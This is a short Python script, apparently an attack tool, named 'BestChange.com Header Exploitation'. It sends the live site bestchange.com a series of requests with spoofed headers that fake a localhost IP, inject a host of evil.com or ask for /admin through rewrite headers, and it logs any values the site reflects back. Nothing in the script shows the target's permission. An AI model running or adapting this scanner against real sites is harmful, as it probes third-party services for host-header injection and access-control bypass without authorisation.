#!/usr/bin/env python3
"""
BestChange.com Header Exploitation Testing
Test all HTTP header manipulation attacks
"""

import requests
import time

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

class HeaderExploiter:
    def __init__(self, base_url="https://www.bestchange.com"):
        self.base_url = base_url
        self.findings = []
    
    def test_header_injection(self):
        """Test various header injection attacks"""
        print(f"{Colors.BLUE}[*] Testing header injection...{Colors.RESET}")
        
        header_tests = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Forwarded-Host': 'evil.com'},
            {'X-Host': 'evil.com'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'X-Forwarded-Proto': 'http'},
            {'X-Forwarded-Scheme': 'http'},
            {'X-Forwarded-Port': '80'},
            {'X-Forwarded-Server': 'evil.com'},
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
        ]
        
        for headers in header_tests:
            try:
                session = requests.Session()
                session.headers.update(headers)
                response = session.get(self.base_url, timeout=5)
                time.sleep(0.2)
                
                # Check if header value is reflected
                for header_name, header_value in headers.items():
                    if header_value in response.text:
                        self.findings.append({
                            'type': 'Header Reflection',
                            'header': header_name,
                            'value': header_value,
                            'severity': 'MEDIUM'
                        })
                        print(f"{Colors.YELLOW}[!] {header_name} reflected: {header_value}{Colors.RESET}")
            except:
                continue
        
        print(f"{Colors.GREEN}[+] Header testing completed{Colors.RESET}")

def main():
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}")
    print(f"{Colors.BLUE}BestChange.com Header Exploitation{Colors.RESET}")
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}\n")
    
    exploiter = HeaderExploiter()
    exploiter.test_header_injection()
    
    if exploiter.findings:
        print(f"\n{Colors.YELLOW}Total findings: {len(exploiter.findings)}{Colors.RESET}")

if __name__ == "__main__":
    main()
